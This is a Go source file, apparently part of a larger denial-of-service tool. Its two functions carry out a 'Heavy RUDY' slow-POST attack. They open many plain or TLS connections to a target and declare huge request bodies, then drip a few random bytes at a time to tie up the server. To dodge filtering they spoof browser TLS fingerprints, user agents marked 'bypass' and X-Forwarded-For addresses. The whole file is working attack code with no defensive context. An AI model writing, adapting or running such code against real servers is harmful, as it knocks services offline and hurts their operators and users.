package main

import (
	"crypto/tls"
	"fmt"
	mrand "math/rand"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

func executeHeavyRUDY() {
	fmt.Printf("[VECTOR] HEAVY RUDY — Direct + TLS\n")
	connsPerThread := 8
	if cfg.threadCount > 100 {
		connsPerThread = 4
	}
	var wg sync.WaitGroup
	for i := 0; i < cfg.threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			rng := mrand.New(mrand.NewSource(time.Now().UnixNano() + int64(id)))
			for c := 0; c < connsPerThread; c++ {
				go func(connId int) {
					target := fmt.Sprintf("%s:%d", cfg.targetHost, cfg.targetPort)
					var conn net.Conn
					var err error
					dialer := &net.Dialer{Timeout: 5 * time.Second}
					if cfg.targetTLS {
						tlsConn, dialErr := tls.DialWithDialer(dialer, "tcp", target, getChromeTLSConfig())
						if dialErr != nil {
							return
						}
						conn = tlsConn
					} else {
						conn, err = dialer.Dial("tcp", target)
						if err != nil {
							return
						}
					}
					defer conn.Close()
					path := randomPath()
					contentLength := 50000000 + rng.Intn(100000000)
					conn.Write([]byte(fmt.Sprintf("POST %s HTTP/1.1\r\n", path)))
					conn.Write([]byte(fmt.Sprintf("Host: %s\r\n", cfg.targetHost)))
					conn.Write([]byte(fmt.Sprintf("User-Agent: %s\r\n", randomBypassUA())))
					conn.Write([]byte("Content-Type: application/x-www-form-urlencoded\r\n"))
					conn.Write([]byte(fmt.Sprintf("Content-Length: %d\r\n", contentLength)))
					conn.Write([]byte("Connection: keep-alive\r\n"))
					conn.Write([]byte(fmt.Sprintf("X-Forwarded-For: %s\r\n", randomIPAddress())))
					conn.Write([]byte("\r\n"))
					byteCount := 0
					for time.Now().Before(stopTime) && byteCount < contentLength {
						data := make([]byte, 1+rng.Intn(5))
						for j := range data {
							data[j] = byte(rng.Intn(94) + 33)
						}
						_, err := conn.Write(data)
						if err != nil {
							return
						}
						byteCount += len(data)
						atomic.AddUint64(&totalRequests, 1)
						delay := 30 + rng.Intn(250)
						if rng.Intn(10) == 0 {
							delay += 200 + rng.Intn(500)
						}
						time.Sleep(time.Duration(delay) * time.Millisecond)
					}
				}(c)
			}
		}(i)
	}
	wg.Wait()
}

func executeMixVectorRUDY(threadCount int) {
	connsPerThread := 10
	var wg sync.WaitGroup
	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			rng := mrand.New(mrand.NewSource(time.Now().UnixNano() + int64(id)))
			for c := 0; c < connsPerThread; c++ {
				go func(connId int) {
					target := fmt.Sprintf("%s:%d", cfg.targetHost, cfg.targetPort)
					var conn net.Conn
					var err error
					dialer := &net.Dialer{Timeout: 5 * time.Second}
					if cfg.targetTLS {
						tlsConn, dialErr := tls.DialWithDialer(dialer, "tcp", target, getChromeTLSConfig())
						if dialErr != nil {
							return
						}
						conn = tlsConn
					} else {
						conn, err = dialer.Dial("tcp", target)
						if err != nil {
							return
						}
					}
					defer conn.Close()
					path := randomPath()
					contentLength := 50000000 + rng.Intn(100000000)
					conn.Write([]byte(fmt.Sprintf("POST %s HTTP/1.1\r\n", path)))
					conn.Write([]byte(fmt.Sprintf("Host: %s\r\n", cfg.targetHost)))
					conn.Write([]byte(fmt.Sprintf("User-Agent: %s\r\n", randomBypassUA())))
					conn.Write([]byte("Content-Type: application/x-www-form-urlencoded\r\n"))
					conn.Write([]byte(fmt.Sprintf("Content-Length: %d\r\n", contentLength)))
					conn.Write([]byte("Connection: keep-alive\r\n"))
					conn.Write([]byte(fmt.Sprintf("X-Forwarded-For: %s\r\n", randomIPAddress())))
					conn.Write([]byte("\r\n"))
					byteCount := 0
					for time.Now().Before(stopTime) && byteCount < contentLength {
						data := make([]byte, 1+rng.Intn(5))
						for j := range data {
							data[j] = byte(rng.Intn(94) + 33)
						}
						_, err := conn.Write(data)
						if err != nil {
							return
						}
						byteCount += len(data)
						atomic.AddUint64(&totalRequests, 1)
						delay := 30 + rng.Intn(250)
						if rng.Intn(10) == 0 {
							delay += 200 + rng.Intn(500)
						}
						time.Sleep(time.Duration(delay) * time.Millisecond)
					}
				}(c)
			}
		}(i)
	}
	wg.Wait()
}
